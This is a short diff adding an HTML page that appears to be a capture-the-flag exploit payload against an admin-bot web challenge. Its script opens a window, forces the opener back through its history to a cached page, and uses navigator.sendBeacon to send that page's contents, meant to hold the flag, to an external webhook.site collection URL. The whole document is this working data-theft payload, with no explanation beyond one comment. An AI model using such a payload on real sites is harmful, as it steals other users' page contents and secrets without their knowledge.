@@ -1,0 +1,17 @@
+<html>
+    <body>
+        <script>
+            // upload index.html to the public dir after the first admin visit which overwrites `/` response and use history.back() to exfill the flag
+            (async()=>{
+                if(opener){
+                    opener.window.history.back()
+                    await new Promise(r=>setTimeout(r,2000));
+                    navigator.sendBeacon('https://webhook.site/49bf9d14-dc50-4582-a5f7-d35ad68edc26',opener.window.document.body.innerHTML)
+                }else{
+                    window.open('/?test')
+                }
+        })()
+            
+        </script>
+    </body>
+</html>
